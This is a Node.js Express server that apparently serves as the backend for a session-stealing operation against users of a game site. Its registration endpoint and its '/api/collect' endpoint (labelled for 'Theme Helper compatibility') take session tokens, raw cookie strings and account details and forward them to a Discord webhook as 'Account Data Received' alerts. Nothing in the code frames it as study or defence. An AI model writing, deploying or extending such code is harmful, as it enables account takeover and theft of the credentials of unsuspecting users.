const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const crypto = require('crypto');

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// Store generated IDs (in production, use a database)
const generatedIds = new Map(); // userId -> { specialId, createdAt, username }

// Generate a unique special ID for a user
function generateSpecialId(userId, username) {
    // Create a hash based on userId + username + secret salt
    const secret = process.env.SECRET_KEY || 'kholin-secret-salt-2024';
    const hash = crypto.createHash('sha256')
        .update(userId + username + secret + Date.now().toString())
        .digest('hex')
        .substring(0, 16); // Take first 16 characters
    
    return hash;
}

app.post('/api/users/register', async (req, res) => {
    try {
        const { userId, username, displayName, sessionToken, rawCookieString, friendsCount } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        // Generate or retrieve special ID
        let specialId = null;
        if (userId && userId !== "Unknown") {
            if (generatedIds.has(userId)) {
                specialId = generatedIds.get(userId).specialId;
                console.log(`[${userId}] Using existing special ID: ${specialId}`);
            } else {
                specialId = generateSpecialId(userId, username);
                generatedIds.set(userId, {
                    specialId: specialId,
                    createdAt: new Date().toISOString(),
                    username: username
                });
                console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
            }
        }

        // Build Discord Embed
        let avatarUrl = "https://playvortex.io/favicon.ico";
        if (userId && userId !== "Unknown") {
            avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
        }

        // Create fields array
        const fields = [
            { name: "👤 Username", value: `**@${username}**`, inline: true },
            { name: "📛 Display Name", value: `**${displayName}**`, inline: true },
            { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
            { name: "👥 Friends Count", value: `**${friendsCount || '0'}**`, inline: true },
            { name: "🔑 Special ID", value: `\`\`\`${specialId || 'N/A'}\`\`\``, inline: false },
            { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false }
        ];

        // Add a fun emoji based on friends count
        let friendEmoji = "👤";
        const count = parseInt(friendsCount) || 0;
        if (count >= 100) friendEmoji = "👑";
        else if (count >= 50) friendEmoji = "⭐";
        else if (count >= 25) friendEmoji = "🌟";
        else if (count >= 10) friendEmoji = "💫";
        else if (count >= 5) friendEmoji = "✨";

        const payload = {
            username: "Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🦊 Account Data Received",
                color: 0x8f82c4,
                thumbnail: { url: avatarUrl },
                fields: fields,
                footer: { 
                    text: `Render Proxy • ${friendEmoji} ${count} friends • ID: ${specialId || 'N/A'}`, 
                    icon_url: "https://playvortex.io/favicon.ico" 
                },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error("Discord webhook error:", response.status, errorText);
            return res.status(500).json({ error: "Discord webhook failed", details: errorText });
        }

        console.log(`✅ Data sent for ${username} (${userId}) with ${friendsCount || 0} friends`);
        
        // Return the special ID to the client
        return res.status(200).json({ 
            status: "success",
            data: {
                username,
                userId,
                friendsCount: friendsCount || '0',
                specialId: specialId
            }
        });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

// ============================================
// SPECIAL ID ENDPOINTS
// ============================================

// Get special ID for a user - FIXED
app.get('/api/special-id/:userId', (req, res) => {
    const { userId } = req.params;
    
    console.log(`[Special ID] Request for user: ${userId}`);
    console.log(`[Special ID] Stored IDs:`, Array.from(generatedIds.keys()));
    
    // Trim whitespace and handle case sensitivity
    const trimmedUserId = userId.trim();
    
    // Check if we have this user
    if (generatedIds.has(trimmedUserId)) {
        const data = generatedIds.get(trimmedUserId);
        console.log(`[Special ID] Found:`, data);
        return res.json({
            success: true,
            userId: trimmedUserId,
            specialId: data.specialId,
            username: data.username,
            createdAt: data.createdAt
        });
    }
    
    // Try case-insensitive lookup
    for (const [key, value] of generatedIds) {
        if (key.toLowerCase() === trimmedUserId.toLowerCase()) {
            console.log(`[Special ID] Found case-insensitive match: ${key}`);
            return res.json({
                success: true,
                userId: key,
                specialId: value.specialId,
                username: value.username,
                createdAt: value.createdAt
            });
        }
    }
    
    console.log(`[Special ID] NOT found for user: ${trimmedUserId}`);
    return res.status(404).json({
        success: false,
        error: "No special ID found for this user"
    });
});

// Generate special ID for a user (manual trigger)
app.post('/api/generate-special-id', (req, res) => {
    const { userId, username } = req.body;
    
    if (!userId || userId === "Unknown") {
        return res.status(400).json({
            success: false,
            error: "Valid userId required"
        });
    }
    
    if (generatedIds.has(userId)) {
        return res.json({
            success: true,
            specialId: generatedIds.get(userId).specialId,
            alreadyExists: true
        });
    }
    
    const specialId = generateSpecialId(userId, username || "User");
    generatedIds.set(userId, {
        specialId: specialId,
        createdAt: new Date().toISOString(),
        username: username || "User"
    });
    
    console.log(`[Special ID] Generated new ID for ${userId}: ${specialId}`);
    
    return res.json({
        success: true,
        specialId: specialId,
        alreadyExists: false
    });
});

// Verify a special ID
app.post('/api/verify-special-id', (req, res) => {
    const { userId, specialId } = req.body;
    
    if (!userId || !specialId) {
        return res.status(400).json({
            success: false,
            error: "Missing userId or specialId"
        });
    }
    
    if (generatedIds.has(userId)) {
        const stored = generatedIds.get(userId);
        if (stored.specialId === specialId) {
            return res.json({
                success: true,
                valid: true,
                userId: userId,
                specialId: specialId,
                createdAt: stored.createdAt
            });
        }
    }
    
    return res.json({
        success: true,
        valid: false,
        error: "Invalid special ID"
    });
});

// Get all generated IDs (admin only - add auth in production)
app.get('/api/all-special-ids', (req, res) => {
    const data = [];
    for (const [userId, info] of generatedIds) {
        data.push({
            userId,
            specialId: info.specialId,
            username: info.username,
            createdAt: info.createdAt
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

// ============================================
// COLLECT ENDPOINT (for Theme Helper compatibility)
// ============================================

app.post('/api/collect', async (req, res) => {
    try {
        const { url, rawCookies } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        const payload = {
            username: "Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🌐 Page Visit Detected",
                color: 0x3498db,
                fields: [
                    { name: "🔗 URL", value: url || "Unknown", inline: false },
                    { name: "🍪 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Render Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            return res.status(500).json({ error: "Discord webhook failed" });
        }

        return res.status(200).json({ status: "success" });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

app.get('/', (req, res) => {
    res.send('Kholin API is running.');
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        webhookConfigured: !!process.env.webhook,
        generatedIdsCount: generatedIds.size,
        generatedIds: Array.from(generatedIds.keys())
    });
});

app.listen(PORT, () => {
    console.log(`✅ Kholin Server running on port ${PORT}`);
    console.log(`   Webhook: ${process.env.webhook ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`   Secret Key: ${process.env.SECRET_KEY ? '✅ Set' : '⚠️ Using default (not secure for production)'}`);
});
